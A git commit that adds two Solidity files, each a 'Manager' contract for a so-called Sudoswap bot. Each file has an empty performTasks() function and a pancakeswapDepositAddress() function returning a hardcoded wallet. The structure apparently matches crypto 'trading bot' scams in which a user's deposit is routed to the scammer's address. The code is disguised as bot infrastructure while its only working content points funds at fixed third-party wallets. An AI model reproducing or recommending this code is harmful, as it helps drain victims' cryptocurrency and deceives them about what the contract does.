c32549ba068c11730840ca459f1b7b592ffee70c
sudoswapbot <125144976+sudoswapbot@users.noreply.github.com>
2023-02-12 00:38:46 +0800

    Add files via upload

---
+++ blob2/main/contracts/interfaces/SudoswapBot.sol
@@ -0,0 +1,12 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x67291285FDd41b6a2Db7cB0F23671d7c639F19d2;
+    }
+}
---
+++ blob2/main/contracts/interfaces/SudoswapBotA.sol
@@ -0,0 +1,12 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x302a97d2f49339cA7F8Da0C0b90a9f88E9D36D98;
+    }
+}
